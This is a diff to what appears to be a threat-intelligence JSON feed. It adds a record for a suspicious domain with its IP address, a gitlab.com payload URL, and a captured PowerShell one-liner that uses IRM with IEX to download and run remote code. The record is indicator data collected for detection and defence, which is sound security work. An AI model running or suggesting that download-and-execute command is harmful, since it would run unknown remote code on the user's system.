@@ -975,5 +975,25 @@
     ],
     "ReportId": "cmwi3te6h0xgl0omlrat1pbrc",
     "ScannedAt": "2026-11-15T17:24:06.080000+00:00"
+  },
+  {
+    "UrlDomain": "www.fabriziobiagioli.it",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "89.46.109.52"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-cc4b6f224188/-/raw/main/01a1db1b-d21d-70c0-971b-cc4b6fe25881 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-cc4b6f224188/-/raw/main/01a1db1b-d21d-70c0-971b-cc4b6fe25881"
+    ],
+    "ReportId": "cmwi4vi5g0xzz0omlk4e25duq",
+    "ScannedAt": "2026-11-15T17:53:44.125000+00:00"
   }
 ]
